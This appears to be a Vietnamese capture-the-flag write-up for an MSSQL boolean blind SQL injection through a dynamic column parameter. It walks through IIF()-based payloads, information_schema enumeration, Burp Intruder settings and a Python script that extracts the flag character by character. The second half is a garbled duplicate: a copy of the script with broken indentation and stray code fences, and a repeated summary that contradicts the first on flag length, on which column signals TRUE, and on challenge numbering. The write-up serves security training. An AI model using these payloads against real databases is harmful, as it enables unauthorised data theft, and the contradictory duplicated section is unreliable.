# SQLi-028: MSSQL Boolean Blind via Dynamic Column - Writeup

## Flag: `FLAG{dyn4m1c_c0lumn_bl1nd}`

---

## 🔍 Bước 1: DETECT - Phát hiện SQLi

Dynamic column injection trong MSSQL sử dụng `IIF()`:

**Normal request:**

```http
GET /?column=report_name HTTP/1.1
```

→ Shows: Q1 Sales Report, Q2 Sales Report, Annual Report, Budget Report

**TRUE condition:**

```http
GET /?column=IIF((SELECT 1)=1,report_name,status) HTTP/1.1
```

→ Shows: Q1 Sales Report, Q2 Sales Report, Annual Report, Budget Report (same as `report_name`)

**FALSE condition:**

```http
GET /?column=IIF((SELECT 1)=2,report_name,status) HTTP/1.1
```

→ Shows: published, draft, published, draft (status column instead)

**Kết luận:** Thứ tự columns khác nhau → Boolean Blind SQLi confirmed! ✅

---

## 🎯 Bước 2: IDENTIFY - Xác định DBMS

**Test MSSQL:**

```http
GET /?column=IIF((SELECT @@VERSION LIKE 'Microsoft%'),status,created_by) HTTP/1.1
```

→ Shows `status` → MSSQL confirmed! ✅

**Alternative:**

```http
GET /?column=IIF((SELECT DB_NAME() IS NOT NULL),status,created_by) HTTP/1.1
```

→ MSSQL-specific function

---

## 🔢 Bước 3: ENUMERATE - Liệt kê thông tin

### 3.1. Đếm số bảng

```http
GET /?column=IIF((SELECT COUNT(*) FROM information_schema.tables)=3,status,created_by) HTTP/1.1
```

→ Shows `status` → Có **3 bảng** ✅

### 3.2. Extract tên bảng

**⚠️ MSSQL không có OFFSET, phải dùng `NOT IN (SELECT TOP N ...)`**

**Bảng thứ 1:**

```http
GET /?column=IIF((SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))='e',status,created_by) HTTP/1.1
```

→ Dùng Burp Intruder với Sniper attack để brute-force từng ký tự
→ Kết quả: **`export_reports`**

**Bảng thứ 2 (dùng NOT IN để skip bảng đầu):**

```http
GET /?column=IIF((SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 1 table_name FROM information_schema.tables)),1,1))='f',status,created_by) HTTP/1.1
```

→ Kết quả: **`flags`** ✅

**Bảng thứ 3:**

```http
GET /?column=IIF((SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables)),1,1))='u',status,created_by) HTTP/1.1
```

→ Kết quả: **`users`**

### 3.3. Extract columns của bảng 'flags'

**⚠️ CRITICAL:** Khi dùng `NOT IN`, **PHẢI filter `WHERE table_name='flags'`** trong cả outer query VÀ subquery!

**Cột thứ 1:**

```http
GET /?column=IIF((SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags'),1,1))='i',status,created_by) HTTP/1.1
```

→ Dùng Burp Intruder để brute-force
→ Kết quả: **`id`**

**Cột thứ 2:**

```http
GET /?column=IIF((SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags' AND column_name NOT IN (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags')),1,1))='n',status,created_by) HTTP/1.1
```

→ Kết quả: **`name`**

**Cột thứ 3:**

```http
GET /?column=IIF((SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags' AND column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns WHERE table_name='flags')),1,1))='v',status,created_by) HTTP/1.1
```

→ Kết quả: **`value`** ✅

### 3.4. Đếm số rows trong bảng 'flags'

```http
GET /?column=IIF((SELECT COUNT(*) FROM flags)=1,status,created_by) HTTP/1.1
```

→ Shows `status` → Có **1 row** ✅

---

## 📤 Bước 4: EXTRACT - Trích xuất FLAG

### 4.1. Xác định độ dài FLAG

```http
GET /?column=IIF((SELECT LEN(value) FROM flags)=26,status,created_by) HTTP/1.1
```

→ Shows `status` → FLAG có **26 ký tự** ✅

### 4.2. Extract từng ký tự

**Burp Intruder - Cluster Bomb Attack:**

**Payload:**

```http
GET /?column=IIF((SELECT SUBSTRING((SELECT value FROM flags),§1§,1))='§F§',status,created_by) HTTP/1.1
```

**Settings:**

- **Attack type:** Cluster Bomb
- **Payload 1 (position):** Numbers 1-26
- **Payload 2 (character):** `FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz`
- **Grep Extract:** Offset → delimiter để lấy nội dung response
- **Indicator:** Tìm dòng có `status` = TRUE

**Kết quả:**
| Position | Character | Response | Status |
|----------|-----------|----------|--------|
| 1 | F | status | ✅ TRUE |
| 2 | L | status | ✅ TRUE |
| 3 | A | status | ✅ TRUE |
| ... | ... | ... | ... |
| 26 | } | status | ✅ TRUE |

→ FLAG: **`FLAG{dyn4m1c_c0lumn_bl1nd}`** 🎉

---

## 🐍 Automated Script

```python
import requests

def check(condition):
    url = f"http://localhost:5028/export?column=IIF(({condition}),status,created_by)"
    r = requests.get(url)
    # TRUE: shows status (published, draft)
    # FALSE: shows created_by (John Smith, Jane Doe, etc.)
    return "published" in r.text or "draft" in r.text

# Step 1: Find FLAG length
print("[*] Finding FLAG length...")
for length in range(1, 40):
    if check(f"(SELECT LEN(value) FROM flags)={length}"):
        print(f"✅ FLAG length = {length}\n")
        break

# Step 2: Extract FLAG character by character
print("[*] Extracting FLAG...")
flag = ""
for pos in range(1, length + 1):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        cond = f"(SELECT SUBSTRING((SELECT value FROM flags),{pos},1))='{c}'"
        if check(cond):
            flag += c
            print(f"[+] Position {pos}: {flag}")
            break
    if c == '}':
        break

print(f"\n🎉 FLAG: {flag}")
```

**Output:**

```
[*] Finding FLAG length...
✅ FLAG length = 26

[*] Extracting FLAG...
[+] Position 1: F
[+] Position 2: FL
[+] Position 3: FLA
[+] Position 4: FLAG
[+] Position 5: FLAG{
[+] Position 6: FLAG{d
...
[+] Position 26: FLAG{dyn4m1c_c0lumn_bl1nd}

🎉 FLAG: FLAG{dyn4m1c_c0lumn_bl1nd}
```

---

## 🎉 Final Flag

```
FLAG{dyn4m1c_c0lumn_bl1nd}
```

---

## 📝 Summary

### Workflow:

1. **DETECT** → Test `IIF((SELECT 1)=1,report_name,status)`
2. **IDENTIFY** → Test `@@VERSION LIKE 'Microsoft%'`
3. **ENUMERATE:**
   - Đếm bảng: `COUNT(*) FROM information_schema.tables=3`
   - Extract bảng thứ 1: `SELECT TOP 1 table_name FROM information_schema.tables`
   - Extract bảng thứ 2: `... WHERE table_name NOT IN (SELECT TOP 1 ...)`
   - Extract bảng thứ 3: `... WHERE table_name NOT IN (SELECT TOP 2 ...)`
   - Extract columns: `WHERE table_name='flags' AND column_name NOT IN (SELECT TOP N ... WHERE table_name='flags')`
   - Đếm rows: `COUNT(*) FROM flags=1`
4. **EXTRACT:**
   - Xác định độ dài: `LEN(value)=26`
   - Extract từng ký tự: `SUBSTRING((SELECT value FROM flags),pos,1)='F'`

### MSSQL NOT IN Pagination (Thay cho OFFSET):

**⚠️ MSSQL không có `LIMIT ... OFFSET`, phải dùng `NOT IN` với `TOP`**

```sql
-- Row thứ 1
SELECT TOP 1 table_name FROM information_schema.tables

-- Row thứ 2 (skip row 1)
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (SELECT TOP 1 table_name FROM information_schema.tables)

-- Row thứ 3 (skip row 1, 2)
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables)

-- Row thứ N (skip N-1 rows đầu)
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (SELECT TOP N-1 table_name FROM information_schema.tables)
```

**⚠️ CRITICAL:** Khi extract columns, **PHẢI filter `WHERE table_name='xxx'`** trong cả outer query VÀ subquery:

```sql
-- ✅ ĐÚNG
SELECT TOP 1 column_name FROM information_schema.columns
WHERE table_name='flags'
AND column_name NOT IN (
    SELECT TOP 2 column_name FROM information_schema.columns
    WHERE table_name='flags'  -- ✅ Filter trong subquery
)

-- ❌ SAI - Thiếu filter trong subquery
SELECT TOP 1 column_name FROM information_schema.columns
WHERE table_name='flags'
AND column_name NOT IN (
    SELECT TOP 2 column_name FROM information_schema.columns
    -- ❌ Sẽ lấy 2 columns bất kỳ từ TẤT CẢ bảng!
)
```

### Phân biệt TRUE/FALSE:

| Condition | Column Selected | Response Content                          |
| --------- | --------------- | ----------------------------------------- |
| TRUE      | `status`        | published, draft, published, draft        |
| FALSE     | `created_by`    | John Smith, Jane Doe, Admin, Finance Team |

### Key Payloads:

```http
// Detect
/?column=IIF((SELECT 1)=1,status,created_by)

// Count tables
/?column=IIF((SELECT COUNT(*) FROM information_schema.tables)=3,status,created_by)

// Extract table 1
/?column=IIF((SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))='e',status,created_by)

// Extract table 2 (skip 1)
/?column=IIF((SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 1 table_name FROM information_schema.tables)),1,1))='f',status,created_by)

// Extract column 3 (skip 2) - CRITICAL: filter WHERE table_name='flags' in subquery!
/?column=IIF((SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags' AND column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns WHERE table_name='flags')),1,1))='v',status,created_by)

// Extract flag
/?column=IIF((SELECT SUBSTRING((SELECT value FROM flags),1,1))='F',status,created_by)
```

### Important Notes:

1. **MSSQL dùng `IIF(condition, true, false)`** cho conditional logic
2. **MSSQL dùng `TOP N`** thay vì `LIMIT N`
3. **MSSQL KHÔNG có `OFFSET`** → Phải dùng `NOT IN (SELECT TOP N ...)`
4. **⚠️ Khi dùng NOT IN để skip rows, PHẢI filter trong subquery** để tránh lấy data từ bảng khác
5. **MSSQL functions:** `SUBSTRING()`, `LEN()`, `DB_NAME()`, `@@VERSION`
6. **Quan sát response content** để phán biệt TRUE/FALSE

### Common Mistakes:

❌ **SAI:**

```sql
-- Dùng LIMIT OFFSET (MySQL syntax)
SELECT ... LIMIT 1 OFFSET 2

-- Thiếu WHERE trong subquery NOT IN
WHERE column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns)

-- Dùng LENGTH() thay vì LEN()
LENGTH(value)=26
```

✅ **ĐÚNG:**

```sql
-- Dùng NOT IN với TOP
WHERE table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables)

-- Filter trong subquery
WHERE column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns WHERE table_name='flags')

-- MSSQL dùng LEN()
LEN(value)=26
```

### MSSQL vs MySQL Comparison:

| Feature           | MSSQL                       | MySQL                   |
| ----------------- | --------------------------- | ----------------------- |
| **Conditional**   | `IIF(cond, true, false)`    | `IF(cond, true, false)` |
| **Limit rows**    | `SELECT TOP 1 ...`          | `SELECT ... LIMIT 1`    |
| **Skip rows**     | `NOT IN (SELECT TOP N ...)` | `LIMIT 1 OFFSET N`      |
| **String length** | `LEN(str)`                  | `LENGTH(str)`           |
| **Substring**     | `SUBSTRING(str,pos,len)`    | `SUBSTR(str,pos,len)`   |
| **Database**      | `DB_NAME()`                 | `DATABASE()`            |
| **Version**       | `@@VERSION`                 | `@@version`             |

### Burp Intruder Settings:

**For extracting table/column names (char by char):**

- **Attack type:** Sniper
- **Payload position:** Character position (1, 2, 3, ...)
- **Payload:** Simple list: `abcdefghijklmnopqrstuvwxyz_0123456789`
- **Grep Extract:** Extract response content
- **Indicator:** Look for `status` or `published/draft`

**For extracting flag:**

- **Attack type:** Cluster Bomb
- **Payload 1:** Numbers 1-26 (position)
- **Payload 2:** `FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz`
- **Grep Extract:** Extract response
- **Indicator:** `status` = TRUE

---

## 🔗 Related Challenges

- **SQLi-027:** MySQL Boolean Blind via ORDER BY (dùng `CASE WHEN` và `LIMIT OFFSET`)
- **SQLi-030:** MSSQL Time-Based Blind (dùng `WAITFOR DELAY`)
- **SQLi-013:** MSSQL Error-Based (dùng `CONVERT()` error)

# Step 2: Extract FLAG character by character

print("[*] Extracting FLAG...")
flag = ""
for pos in range(1, length + 1):
for c in "FLAG{}\_0123456789abcdefghijklmnopqrstuvwxyz":
cond = f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"
if check(cond):
flag += c
print(f"[+] Position {pos}: {flag}")
break
if c == '}':
break

print(f"\n🎉 FLAG: {flag}")

```

---

## 🎉 Final Flag

```

FLAG{dyn4m1c_c0lumn_bl1nd}

````

---

## 📝 Summary

### Workflow:

1. **DETECT** → Test `IIF((SELECT 1)=1,report_name,status)`
2. **IDENTIFY** → Test `@@VERSION LIKE 'Microsoft%'` hoặc `DB_NAME()`
3. **ENUMERATE:**
   - Đếm bảng: `COUNT(*) FROM information_schema.tables...=3`
   - Extract tên bảng: `SELECT TOP 1 table_name ... NOT IN (SELECT TOP N ...)`
   - Extract columns: `SELECT TOP 1 column_name ... WHERE table_name='flags' AND column_name NOT IN (SELECT TOP N ... WHERE table_name='flags')`
4. **EXTRACT:**
   - Xác định độ dài: `LEN(value)=25`
   - Extract từng ký tự: `SUBSTRING(value,pos,1)='F'`

### MSSQL Boolean Blind Syntax:

```sql
-- Basic structure
IIF(condition, true_value, false_value)

-- Examples
IIF((SELECT 1)=1, report_name, status)
IIF((SELECT @@VERSION LIKE 'M%'), report_name, status)
IIF((SELECT LEN(value) FROM flags)=25, report_name, status)
````

### Phân biệt TRUE/FALSE:

| Condition | Column Selected | Response Content                                               |
| --------- | --------------- | -------------------------------------------------------------- |
| TRUE      | report_name     | Q1 Sales Report, Q2 Sales Report, Annual Report, Budget Report |
| FALSE     | status          | published, draft, published, draft                             |
| TRUE      | created_by      | John Smith, Jane Doe, Admin, Finance Team                      |

### Key Payloads:

```http
// Detect
?column=IIF((SELECT 1)=1,report_name,status)

// Count tables
?column=IIF((SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE')=3,report_name,status)

// Extract table name (char by char)
?column=IIF((SELECT SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_type='BASE TABLE'),1,1))='f',report_name,status)

// Extract column name (with NOT IN)
?column=IIF((SELECT SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags' AND column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns WHERE table_name='flags')),1,1))='v',report_name,status)

// Extract flag
?column=IIF((SELECT SUBSTRING(value,1,1) FROM flags)='F',report_name,status)
```

### Important Notes:

1. **MSSQL dùng `IIF()` cho conditional logic** (không dùng `CASE WHEN` như MySQL)
2. **Dùng `TOP N` thay vì `LIMIT`** để giới hạn rows
3. **Dùng `NOT IN (SELECT TOP N ...)` để skip rows** đã lấy (thay vì `OFFSET`)
4. **⚠️ CRITICAL:** Khi dùng `NOT IN`, **PHẢI filter `WHERE table_name='flags'`** trong subquery!
5. **MSSQL functions:** `SUBSTRING()`, `LEN()`, `DB_NAME()`, `@@VERSION`
6. **Quan sát response content** để phân biệt TRUE/FALSE

### Common Mistakes:

❌ **SAI:**

```sql
-- Thiếu WHERE trong subquery NOT IN
AND column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns)
-- Lấy 2 columns từ TẤT CẢ các bảng!

-- Dùng LIMIT thay vì TOP
SELECT ... LIMIT 1

-- Dùng LENGTH() thay vì LEN()
LENGTH(value)=25
```

✅ **ĐÚNG:**

```sql
-- Phải filter table_name trong subquery
AND column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns WHERE table_name='flags')

-- MSSQL dùng TOP
SELECT TOP 1 ...

-- MSSQL dùng LEN()
LEN(value)=25
```

### MSSQL vs MySQL Comparison:

| Feature           | MSSQL                       | MySQL                                    |
| ----------------- | --------------------------- | ---------------------------------------- |
| **Conditional**   | `IIF(cond, true, false)`    | `IF(cond, true, false)` hoặc `CASE WHEN` |
| **Limit rows**    | `SELECT TOP 1 ...`          | `SELECT ... LIMIT 1`                     |
| **Skip rows**     | `NOT IN (SELECT TOP N ...)` | `LIMIT 1 OFFSET N`                       |
| **String length** | `LEN(str)`                  | `LENGTH(str)`                            |
| **Substring**     | `SUBSTRING(str,pos,len)`    | `SUBSTR(str,pos,len)`                    |
| **Database**      | `DB_NAME()`                 | `DATABASE()`                             |
| **Version**       | `@@VERSION`                 | `@@version` hoặc `VERSION()`             |

### Tips for Burp Intruder:

1. **Grep Extract:** Lấy report_name đầu tiên để phản biệt TRUE/FALSE
2. **Indicator:** "Q1 Sales" hoặc "Annual" = TRUE, "published" hoặc "draft" = FALSE
3. **Attack types:**
   - **Sniper** cho finding length
   - **Cluster Bomb** cho extracting characters (position × character)
4. **⚠️ Response Length không reliable** vì TRUE/FALSE có thể trả về content tương tự!

---

## 🔗 Related Challenges

- **SQLi-027:** MySQL Boolean Blind via ORDER BY (dùng `CASE WHEN`)
- **SQLi-029:** MSSQL Time-Based Blind (dùng `WAITFOR DELAY`)
- **SQLi-013:** MSSQL Error-Based (dùng `CONVERT()` error)
